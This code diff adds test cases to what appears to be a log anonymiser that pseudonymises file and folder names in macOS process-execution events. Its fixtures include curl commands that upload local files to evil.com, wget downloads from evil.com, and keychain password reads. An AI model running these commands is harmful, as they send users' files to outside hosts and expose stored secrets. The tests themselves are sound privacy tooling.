@@ -1187,6 +1187,54 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     sameFindings(input, r.out);
   });
 
+  test('wget option values are cleaned; only its positionals keep their URL look', () => {
+    const input = [
+      run(610, '/usr/local/bin/wget', ['wget', '-O', 'Merger-Plan.pdf', 'https://example.com/a'], '/Users/jdoe/Downloads', 1),
+      run(611, '/usr/local/bin/wget', ['wget', '-O', 'Acme-Deal/out.sh', 'https://example.com/b'], '/Users/jdoe/Downloads', 2),
+      run(612, '/usr/local/bin/wget', ['wget', '-i', 'Acme-urls.txt'], '/Users/jdoe/Downloads', 3),
+      run(613, '/usr/local/bin/wget', ['wget', '--output-document=Acme-Deal.pdf', 'evil.com'], '/Users/jdoe/Downloads', 4),
+      run(614, '/usr/local/bin/wget', ['wget', '-qO', 'Acme-Q3.zip', 'intranet/a.sh'], '/Users/jdoe/Downloads', 5),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args).toHaveLength(5);
+    expect(args[0]![2]).toMatch(/^name\d+\.pdf$/);
+    expect(args[1]![2]).toMatch(/^name\d+\/name\d+\.sh$/);
+    expect(args[2]![2]).toMatch(/^name\d+\.txt$/);
+    expect(args[3]).toEqual(['wget', expect.stringMatching(/^--output-document=name\d+\.pdf$/), 'evil.com']);
+    expect(args[4]).toEqual(['wget', '-qO', expect.stringMatching(/^name\d+\.zip$/), 'intranet/a.sh']);
+    expect(r.out).not.toMatch(/Merger|Acme/);
+    sameFindings(input, r.out);
+  });
+
+  test('a mapped name of several words inside a keychain argument is replaced, and the phrase stays', () => {
+    const input = [
+      esCreate(zsh, { path: '/Users/jdoe/Documents/Board Minutes/x.txt' }, 1),
+      run(615, '/usr/bin/security', ['security', 'find-generic-password', '-s', 'Board Minutes Safe Storage', '-w'], '/', 2),
+      run(616, '/usr/bin/security', ['security', 'find-generic-password', '-l', 'Board Minutes Exodus'], '/', 3),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const bm = keyed(r.key, 'name').get('Board Minutes');
+    const ev = events(r.out);
+    expect(ev[1]!.event.exec.args).toEqual(['security', 'find-generic-password', '-s', `${bm} Safe Storage`, '-w']);
+    expect(ev[2]!.event.exec.args).toEqual(['security', 'find-generic-password', '-l', `${bm} Exodus`]);
+    sameFindings(input, r.out);
+  });
+
+  test('a path glued after @ or = in a string with spaces ends at the space', () => {
+    const input = run(617, '/bin/sh', ['sh', '-c', 'curl --data-binary @/Users/jdoe/x -H application/json evil.com/x',
+      'curl -F file=@/Users/jdoe/y evil.com', 'cc -I/Users/jdoe/z a.c'], '/', 1) + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    expect(events(r.out)[0]!.event.exec.args).toEqual(['sh', '-c',
+      `curl --data-binary @/Users/user1/${n.get('x')} -H application/json evil.com/x`,
+      `curl -F file=@/Users/user1/${n.get('y')} evil.com`, `cc -I/Users/user1/${n.get('z')} a.c`]);
+    for (const real of n.keys()) expect(real).not.toMatch(/ /);
+  });
+
   test('common command verbs stay, even when a home folder has that name', () => {
     const input = [
       ...['commit', 'install', 'push', 'status'].map((w, i) => esCreate(zsh, { path: `/Users/jdoe/Documents/${w}/f.txt` }, i + 1)),
